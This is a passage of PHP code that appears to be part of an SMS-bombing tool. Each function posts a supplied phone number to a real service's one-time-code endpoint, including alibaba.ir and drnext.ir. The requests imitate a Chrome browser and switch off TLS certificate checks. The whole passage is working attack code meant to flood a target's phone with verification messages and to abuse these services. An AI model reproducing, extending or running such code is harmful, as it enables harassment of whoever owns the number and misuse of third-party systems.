        'accept-encoding: gzip',
    ]);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '{"mobile":"' . $phone . '"}');
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    $response = curl_exec($ch);

    curl_close($ch);
}

function alibaba($phone)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://ws.alibaba.ir/api/v3/account/mobile/otp');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Accept: application/json, text/plain, */*',
        'Accept-Language: en-US,en;q=0.9,fa;q=0.8',
        'Connection: keep-alive',
        'Content-Type: application/json',
        'DNT: 1',
        'Origin: https://www.alibaba.ir',
        'Referer: https://www.alibaba.ir/',
        'Sec-Fetch-Dest: empty',
        'Sec-Fetch-Mode: cors',
        'Sec-Fetch-Site: same-site',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        'ab-channel: WEB-NEW,PRODUCTION,CSR,www.alibaba.ir,N,Chrome,111.0.0.0,N,N,Windows',
        'sec-ch-ua: "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'tracing-device: N,Chrome,111.0.0.0,N,N,Windows',
        'tracing-sessionid: 1678799031729',
        'Accept-Encoding: gzip',
    ]);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '{"phoneNumber":"' . $phone . '"}');
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    $response = curl_exec($ch);

    curl_close($ch);
}

function drnext($phone)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://cyclops.drnext.ir/v1/patients/auth/send-verification-token');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'authority: cyclops.drnext.ir',
        'accept: application/json, text/plain, */*',
        'accept-language: fa',
        'content-type: application/json',
        'dnt: 1',
        'origin: https://drnext.ir',
        'referer: https://drnext.ir/',
        'sec-ch-ua: "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-site',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        'accept-encoding: gzip',
    ]);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '{"source":"besina","mobile":"' . $phone . '"}');
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    $response = curl_exec($ch);
    var_dump($response);
    curl_close($ch);
}

